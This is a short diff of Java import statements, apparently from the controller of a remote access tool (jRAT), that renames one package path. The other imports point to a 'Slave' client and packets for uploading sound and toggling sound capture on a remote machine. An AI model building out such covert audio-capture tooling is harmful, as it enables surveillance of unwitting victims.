@@ -1,7 +1,7 @@
 package jrat.controller.ui.dialogs;
 
 import iconlib.IconUtils;
-import io.jrat.common.SoundWriter;
+import jrat.common.SoundWriter;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet83ServerUploadSound;
 import jrat.controller.packets.outgoing.Packet84ToggleSoundCapture;
